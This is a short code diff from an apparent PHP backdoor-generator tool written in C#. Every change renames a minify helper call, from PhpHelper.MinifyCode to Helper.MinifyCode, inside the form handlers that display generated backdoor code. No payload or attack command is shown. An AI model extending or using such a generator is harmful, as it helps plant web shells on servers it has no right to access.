@@ -86,7 +86,7 @@ namespace bantam_php
             }
 
             if (chkbxMinifyCode.Checked) {
-                backdoorResult = PhpHelper.MinifyCode(backdoorResult);
+                backdoorResult = Helper.MinifyCode(backdoorResult);
             }
             return backdoorResult;
         }
@@ -100,7 +100,7 @@ namespace bantam_php
         {
             if (chkbxMinifyCode.Checked) {
                 string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-                richTextBoxBackdoor.Text = PhpHelper.MinifyCode(backdoorCode);
+                richTextBoxBackdoor.Text = Helper.MinifyCode(backdoorCode);
             } else {
                 richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
             }
@@ -115,7 +115,7 @@ namespace bantam_php
         {
             if (chkbxMinifyCode.Checked) {
                 string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-                richTextBoxBackdoor.Text = PhpHelper.MinifyCode(backdoorCode);
+                richTextBoxBackdoor.Text = Helper.MinifyCode(backdoorCode);
             } else {
                 richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
             }
@@ -145,7 +145,7 @@ namespace bantam_php
         {
             if (chkbxMinifyCode.Checked) {
                 string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-                richTextBoxBackdoor.Text = PhpHelper.MinifyCode(backdoorCode);
+                richTextBoxBackdoor.Text = Helper.MinifyCode(backdoorCode);
             } else {
                 richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
             }
@@ -155,7 +155,7 @@ namespace bantam_php
         {
             if (chkbxMinifyCode.Checked) {
                 string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-                richTextBoxBackdoor.Text = PhpHelper.MinifyCode(backdoorCode);
+                richTextBoxBackdoor.Text = Helper.MinifyCode(backdoorCode);
             } else {
                 richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
             }
